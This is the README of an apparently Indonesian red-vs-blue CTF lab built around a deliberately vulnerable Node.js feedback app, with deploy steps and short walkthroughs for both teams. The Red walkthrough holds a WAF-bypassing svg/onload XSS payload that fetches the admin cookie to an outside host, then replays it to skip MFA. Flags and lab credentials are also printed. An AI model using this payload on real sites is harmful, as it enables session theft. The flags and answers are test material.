# Cyber Range — Red vs. Blue Lab: "Cookies Reuse & MFA Bypass"

Self-contained CTF lab (Admin Feedback System) untuk training offensive (Red) &
defensive (Blue). Vulnerable Node.js web app + WAF bypass (XSS) + session replay
(MFA bypass), lengkap dengan telemetry log forensik untuk Blue Team.

> ⚠️ Aplikasi ini **sengaja rentan**. Jalankan hanya di lab terisolasi.

## Arsitektur singkat

| Service | Peran |
|---|---|
| `nginx` | Reverse proxy port **3075**, menulis `access.log`/`error.log` ke `/opt/admin/logs` |
| `app` | Node.js Admin Feedback System (vulnerable; semua flag Red) |
| `admin-bot` | Korban simulasi (Playwright) yang memicu Stored XSS |

- Web app: `http://<IP-VM>:3075`
- SSH Blue Team: `ssh analyst@<IP-VM> -p 2275` (password: `blue_team_rocks`)
- Log forensik: `/opt/admin/logs/{access.log,error.log}`

## Deploy

### A) Proxmox (otomatis, cloud-init)
1. Buat VM Ubuntu 22.04 (cloud image) di Proxmox.
2. Lampirkan `cloud-init/user-data` (isi `<REPO_URL>` + hash password `analyst`).
3. Boot VM → semuanya ter-provision otomatis.

### B) VM Ubuntu apa pun (termasuk VirtualBox untuk testing)
```bash
git clone <REPO_URL> /opt/cyber-range && cd /opt/cyber-range
sudo bash scripts/bootstrap.sh
```

### C) Cepat di lokal (Docker Desktop) — hanya untuk uji app
```bash
mkdir -p /opt/admin/logs            # atau sesuaikan device bind di compose
docker compose up -d --build
LOG_DIR=/opt/admin/logs python3 scripts/inject_logs.py
```

## Walkthrough Red Team (ringkas)
```bash
curl -i http://<IP>:3075/                # X-Powered-By: Node.js
curl http://<IP>:3075/robots.txt         # /api/verify-mfa, /dashboard
# <script> -> 403 (WAF):
curl -i -X POST http://<IP>:3075/feedback -d "name=a&message=<script>alert(1)</script>"
# bypass <svg> + exfil fetch + obfuscation (tersimpan, 200):
curl -i -X POST http://<IP>:3075/feedback --data-urlencode "name=a" \
  --data-urlencode "message=<svg onload=\"fetch('http://10.10.14.50:9000/c?d='+window['docu'+'ment']['coo'+'kie'])\">"
# admin-bot membuka /dashboard -> XSS exfil cookie adm_sess -> replay:
curl -i http://<IP>:3075/dashboard -H "Cookie: session=adm_sess_<curian>"
# Flag: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

## Walkthrough Blue Team (ringkas)
```bash
ssh analyst@<IP> -p 2275 ; cd /opt/admin/logs
grep "/dashboard" access.log | grep " 200 "          # 18:51:55 + XFF Base64
grep "<script>" error.log                             # WAF block 18:50:15
grep "10.10.14.50" access.log | grep "/api/verify-mfa" # kosong = No (MFA dilewati)
echo "UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0" | base64 -d  # flag final Blue
grep "Authentication bypass anomaly" error.log         # CRITICAL @ 18:53:10
```

## Reset sebelum demo
```bash
sudo bash scripts/reset.sh
```

## Struktur repo
```
.
├── app/                  Node.js vulnerable app + Dockerfile
├── nginx/default.conf    reverse proxy + format log
├── admin-bot/            korban simulasi (Playwright) + Dockerfile
├── scripts/
│   ├── inject_logs.py    penyuntik timeline serangan (Blue Team)
│   ├── bootstrap.sh      provisioning VM (Docker, SSH 2275, deploy, logs)
│   └── reset.sh          reset state untuk demo
├── cloud-init/user-data  provisioning otomatis Proxmox
├── docker-compose.yml
├── SUBMISSION.md         dokumen submission (jawaban tertulis)
└── SUBMISSION_appendix.md  lampiran source code lengkap
```
